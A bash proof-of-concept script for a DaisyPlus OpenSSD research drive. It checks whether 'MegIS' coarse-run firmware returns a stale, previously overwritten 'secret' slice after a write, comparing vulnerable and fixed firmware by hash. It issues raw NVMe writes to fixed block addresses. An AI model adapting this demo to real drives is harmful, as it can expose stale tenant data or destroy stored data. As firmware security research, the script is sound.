#!/usr/bin/env bash
# MegIS coarse-run demo on the DaisyPlus OpenSSD.
# Establishes a coarse run over LSAs [4096,4112), overwrites a slice inside it,
# then reads that slice.  Attack fw: coarse run left stale -> read returns the
# OLD slice.  Checked fw: run dropped on the write -> read returns the NEW data.
# DaisyPlus-only guard.
set -u
DEV=/dev/nvme0; NS=/dev/nvme0n1
MODEL=$(nvme id-ctrl "$DEV" 2>/dev/null | awk -F: '/^mn /{sub(/^[ ]+/,"",$2);print $2}')
echo "Target $DEV model: [$MODEL]"
case "$MODEL" in *DaisyPlus*|*OpenSSD*) : ;; *) echo "ABORT: not DaisyPlus (got '$MODEL')."; exit 1;; esac
WORK=$(mktemp -d); trap 'rm -rf "$WORK"' EXIT

# LSA=LBA/4.  coarse run LSA[4096,4112) -> LBA[16384,16448); register LSA4095 -> LBA16380;
# target slice LSA4099 -> LBA16396.
BASE_LBA=16384; REG_LBA=16380; SLICE3_LBA=16396; PAD=100000
NBLK=3; SZ=16384    # 4 blocks = one 16 KiB slice
python3 - "$WORK" <<'PY'
import sys,os; w=sys.argv[1]
open(os.path.join(w,"filler.bin"),"wb").write((b"MEGIS-FILLER-slice "*1000)[:16384])
open(os.path.join(w,"old3.bin"),"wb").write((b"MEGIS-OLD-SLICE-3 original tenant data. "*500)[:16384])
open(os.path.join(w,"new3.bin"),"wb").write((b"MEGIS-NEW-OVERWRITE fresh data. "*600)[:16384])
open(os.path.join(w,"reg.bin"),"wb").write((b"REGVAL "*3000)[:16384])
open(os.path.join(w,"pad.bin"),"wb").write((b"PADDING-flush "*80000)[:1048576])
PY
CHUNK=0; for c in 256 128 64 32 16 8 4; do
  nvme write "$NS" --start-block=200000 --block-count=$((c-1)) --data-size=$((c*4096)) --data="$WORK/pad.bin" >/dev/null 2>&1 && { CHUNK=$c; break; }; done
[ "$CHUNK" -gt 0 ] || { echo "no working chunk"; exit 1; }
w1(){ nvme write "$NS" --start-block=$1 --block-count=$NBLK --data-size=$SZ --data="$2" >/dev/null 2>&1; }
flush(){ local lba=$PAD b=0 t=$((1024*4)); while [ $b -lt $t ]; do local st=$CHUNK; [ $((b+st)) -gt $t ] && st=$((t-b));
  nvme write "$NS" --start-block=$lba --block-count=$((st-1)) --data-size=$((st*4096)) --data="$WORK/pad.bin" >/dev/null 2>&1; lba=$((lba+st)); b=$((b+st)); done; nvme flush "$NS" >/dev/null 2>&1; }
sha(){ sha256sum "$1"|awk '{print $1}'; }

echo "== write 16 slices of the coarse range [LSA 4096..4111]; slice 3 = OLD secret =="
for i in $(seq 0 15); do
  lba=$((BASE_LBA + i*4))
  if [ "$i" = "3" ]; then w1 $lba "$WORK/old3.bin"; else w1 $lba "$WORK/filler.bin"; fi
done
w1 $REG_LBA "$WORK/reg.bin"     # map LSA 4095 so the register read is clean
flush
echo "== register the coarse run (read LSA 4095 -> snapshot [4096,4112)) =="
nvme read "$NS" --start-block=$REG_LBA --block-count=0 --data-size=4096 --data="$WORK/regread" >/dev/null 2>&1

echo "== OVERWRITE slice 3 (LSA 4099 / LBA $SLICE3_LBA) with NEW data =="
w1 $SLICE3_LBA "$WORK/new3.bin"
flush

echo "== read slice 3 (LSA 4099) back =="
nvme read "$NS" --start-block=$SLICE3_LBA --block-count=$NBLK --data-size=$SZ --data="$WORK/read3" >/dev/null 2>&1

O=$(sha "$WORK/old3.bin"); N=$(sha "$WORK/new3.bin"); R=$(sha "$WORK/read3")
echo; echo "===================== RESULT ====================="
echo "old slice-3   sha256 = $O"
echo "new overwrite sha256 = $N"
echo "read slice-3  sha256 = $R"
echo "read slice-3 first 48 bytes:"; head -c 48 "$WORK/read3"; echo
echo
if [ "$R" = "$O" ]; then
  echo ">>> STALE: read returned the OLD slice via the stale coarse run (attack succeeded)."
elif [ "$R" = "$N" ]; then
  echo ">>> CORRECT: read returned the NEW data; coarse run was dropped (prevented)."
else
  echo ">>> read matched neither old nor new (unexpected)."
fi
echo "=================================================="
